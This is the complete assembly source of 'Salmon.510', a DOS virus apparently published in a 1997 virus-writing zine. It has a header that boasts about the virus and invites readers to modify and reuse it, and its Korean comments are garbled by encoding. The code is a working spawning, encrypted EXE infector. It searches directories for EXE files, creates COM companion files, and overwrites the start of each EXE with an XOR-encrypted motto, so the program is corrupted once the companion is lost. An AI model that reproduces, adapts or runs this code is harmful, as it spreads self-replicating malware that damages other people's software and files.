;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                        Salmon.510 virus                       CVC #01, 97/06
;                        ****************
;
;  ·¡Ÿq : Salmon.510
;  ¹A¸b¸a : Nemisis
;  ¦…¬â : Osiris of CVC,Corea / 1997.05
;  ¹·ŸA : §¡¬wºÑw  ¬eœeÑw
;  Â‰Àá : Nemesis Issue #01
;
; Happy Salmon - Like fish, we spawn and die.
; Spawning, Encrypted EXE Infector
;
; This virus is silly. It has no purpose, point, or meaning. I was bored
; and felt like making something. It lacks any real content or even a
; decent directory traversal routine. Adding one would make the virus more
; effective at spreading. At 510 bytes, the virus tips the scales.
;
; Upon finding an EXE file to infect the virus creates a COM companion file.
; It then proceeds to copy over the first 16 bytes of the file with the motto.
; Without the COM file to fix-up the EXE at runtime the EXE's are effectively
; trashed. The virus is encrypted to prevent easily making a patch to remove
; the virus from afflicted EXE programs. There is no "destructive" code so
; to speak.
;
; Feel free to mod/rip; that's why you have it!
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
code    segment public 'code'
        assume  cs:code,ds:code,es:code,ss:code
        org     100h
        jumps

start:
       call     encrypt                 ; ´qÑ¡ Î‰‹¡

virus:
       mov      byte ptr flag,1         ; Fixup!
       call     fixup_fuckup            ;

       mov      bx,offset endheap       ; ¤a·¡œá¯a· {
       shr      bx,4                    ; Ìœa‹aœÏ¡ ”e¶á¡ a’‘
       inc      bx                      ; +1
       mov      ah,4Ah                  ; ¡A¡¡Ÿ¡ Ça‹¡ ¸¹¡¸÷
       int      21h                     ;

       mov      stackseg,ss             ; ¯aÈ‚ ¸á¸w (SS:SP)
       mov      stackptr,sp             ;

       mov      sp,offset endheap-offset start+100h ; SP ¸»¡¸÷

; Int 2Eh - SI Offset 0 = Size of String Not Including CR
;           SI Offset 1 = String (gotta love that interrupt guide)

       mov      si,offset spawn          ; ¬eœe·¡Ÿq
       int      2Eh                      ; ¯©Ð—

       mov      ss,stackseg              ; Stack ¥¢Š
       mov      sp,stackptr

       push     cs                      ; cs=ds=es
       pop      ds
       push     cs
       pop      es

       mov      byte ptr flag,0         ;
       call     fixup_fuckup            ; Fuckup!

       mov      ah,47h                  ; Ñe¸ —¡BÉ¡Ÿ¡ ´è‹¡
       xor      cx,cx
       mov      si,offset curdir
       int      21h

       mov      ah,2Ch                  ; ´qÑ¡ÑÁ Ði ˆt ´è‹¡
       int      21h
       mov      word ptr encval,dx

       mov      dx,offset dta           ; ¬¡¶… DTA ¬é¸÷
       mov      ah,1Ah
       int      21h

       mov      dx,offset exespec       ; EXE Ìa·© Àx‹¡
       mov      ah,4Eh                  ; (*.E*)

find_file:
       int      21h
       jc       drop_dir

       call     baby_maker              ; •··© Ðe COM Ìa·© ¬—¬÷

       cmp      byte ptr run,3          ; 3 ˆŸi ˆqµq¯¡Åva ?
       jge      quit

find_next:
       mov      ah,4Fh                  ; ”a·q Ìa·© Àx‹¡
       jmp      short find_file

drop_dir:
       mov      ah,3Bh                  ; ¬w¶á —¡BÉ¡Ÿ¡¡ ·¡•·
       mov      dx,offset dotdot
       int      21h
       jc       quit
       ret

baby_maker:

       mov      si,offset dta+30        ;
       mov      di,offset asciiz        ;
asc:
       lodsb
       stosb
       cmp      al,0                    ; { ?
       jne      asc

       mov      si,offset dta+30
       mov      di,offset spawn+1
       mov      dx,di
       xor      ax,ax

exe2com:
       lodsb                            ; SI->AL
       stosb                            ; AL->DI
       inc      ah                      ; »wˆa
       cmp      al,'.'                  ; ÑÂ¸w¸a ˆñ¬a
       jne      exe2com

       mov      word ptr [di],'OC'      ; COM »³´á ý‹¡
       mov      word ptr [di+2], 04Dh   ;

       add      ah,3                    ; For Extension
       mov      byte ptr offset spawn,ah

       mov      cx,00100011b            ; •··© ·¡Ÿq· COM Ìa·© ¬—¬÷
       mov      ah,05Bh                 ; 3Ch µÁ ”aŸa‰A ·¡‹¡“w·e Ìa·©·¡ ¹¥¸Ða
       int      21h                     ; ¡e ¯©ÌÐe”a.
       jc       find_next               ; Ìa·©·¡ ¹¥¸ Ðaa ?

       inc      byte ptr run            ; ˆqµqÒU® »wˆa
       xchg     bx,ax                   ; BX = Ìa·© Ð…—i

       mov      word ptr [di], 'XE'     ;
       mov      word ptr [di+2], 0D45h  ; CR+'E' Make Back Into EXE File

       mov      ah,40h                  ; ³a‹¡
       mov      dx,offset start
       mov      cx,offset virus-start
       int      21h                     ;

       inc      word ptr encval         ;

       mov      byte ptr flag,0         ;
       call     fixup_fuckup

       call     q_encrypt               ; ´qÑ¡ÑÁ & ³a‹¡

       mov      ah,03Eh                 ; Ìa·© ”h‹¡
       int      21h                     ;
       jmp      short quit

fixup_fuckup:
       push     bx

       mov      dx,offset asciiz        ;
       mov      ax,3D02h                ; ¶¥œ EXE Ìa·© µi‹¡
       int      21h                     ;

       xchg     bx,ax                   ; BX=Ìa·© Ð…—i

       mov      ax,4200h                ; Àá·q·a¡ ·¡•·
       xor      cx,cx                   ; (³i•A ´ô“e ¡ww—i·±...)
       cwd                              ; Ìa·© µ¡Ïe¯¡ ¶¥œ ‹¡¥¥¸â·a¡ Í¡·¥Èá“e
       int      21h                     ; Àá·q·±

       cmp      byte ptr flag,1         ; flag ˆa 1 ·¡¡e ¥¢Š
       je       fixup

       mov      ah,3Fh                  ; EXE Ìa·©· ´|¦¦… ·ª‹¡
       mov      cx,28                   ; ¬eœeÑw ¤a·¡œá¯a·¡»¡ e ”e®…Ó¡ COM Ìa·©
       mov      dx,offset bbyte         ; ·i ¹Aˆá Ða“e ˆõ e·a¡“e Ã¡ža Ði ®´ô
       int      21h                     ; ”a. ¶¥œ EXE Ìa·©· ´|¦¦…·i ¬eœe–E
                                        ; COM Ìa·© ¦µA ¸á¸wÐa‹¡ ˜¢…·¡”a.
       mov      ax,4200h                ;
       xor      cx,cx                   ;
       cwd                              ;
       int      21h                     ; Ìa·©· Àñ·a¡ ·¡•·

       mov      cx,14                   ;
       mov      si,offset motto         ;
       mov      di,offset xorred_motto  ;
       mov      dx,sp                   ; An Nice Way to Get Encrypt Value

fuck_motto:
       lodsw                            ;
       xor      ax,dx                   ; ´qÑ¡ÑÁ
       stosw                            ;
       loop     fuck_motto              ;

       mov      ah,40h
       mov      dx,offset xorred_motto
       mov      cx,28
       int      21h                     ; Overwrite 28 Bytes With Motto
       jmp      short close

fixup:
       mov      ah,40h                  ; ¶¥œ ´|¦¦… ¥¢Š
       mov      dx,offset bbyte
       mov      cx,28
       int      21h                     ;
close:
       mov      ah,03Eh
       int      21h
       pop      bx
       ret

quit:

       mov      ah,3Bh                  ; ¶¥œ —¡BÉ¡Ÿ¡¡ ·¡•·
       mov      dx,offset curdir
       xor      cx,cx
       int      21h

       mov      ah,4Ch                  ; {‹¡
       int      21h

exespec   db     '*.E*',0               ; EXE Ìa·© Àx‹¡
spawn     db     13,13 dup(0),13        ; Ìa·© ·¡Ÿq

vname     db    '[Happy Salmon]'        ; ¤a·¡œá¯a ·¡Ÿq
vwhom     db    '[Nemesis]'             ; ¹A¸b¸a
vwhere    db    '[USA]'                 ; ¹A¸b»¡
motto     db    'Like fish, we spawn and die.'
bbyte     db     28 dup (0)
asciiz    db     13 dup (0)
dotdot    db    '..',0                  ; ¬w¶á —¡BÉ¡Ÿ¡¡ ·¡•·

;
;
q_encrypt:
       mov      si,offset move_str      ;
       mov      di,offset space         ;
       mov      cx,offset move_end-move_str
       rep      movsb                   ; Move The Next Routine Into
                                        ; Memory
       mov      dx,offset space
       call     dx                      ; Call The Copied Routine
       ret

move_str:
       mov      dx,offset encrypt
       call     dx                      ; ´qÑ¡ÑÁ

       mov      dx,offset virus         ; ¤a·¡œá¯a ³a‹¡
       mov      cx,offset heap-virus    ; ‹©·¡
       mov      ah,40h
       int      21h                     ; ³a‹¡

       mov      dx,offset encrypt
       call     dx                      ; ´qÑ¡ Î‰‹¡
       ret
move_end:

encrypt:
       mov      di,word ptr encval      ;
       mov      si,offset virus
       mov      cx,(offset move_end-offset virus)/2
xorit:
       xor      word ptr [si],di
       inc      si
       inc      si
       loop     xorit
       ret
encval    dw     0

;------------[—¡¯aÇaµA ¸á¸w´e–A“e ¦¦…]--------------------------------------
heap:
dta              db     42   dup (?)           ; New DTA
stackseg         dw     ?
stackptr         dw     ?
space            db     offset move_end-offset move_str dup(?)
run              db     ?
flag             db     ?
curdir           db     64  dup (?)
xorred_motto     dw     14  dup  (?)
endheap:

code ends
end start
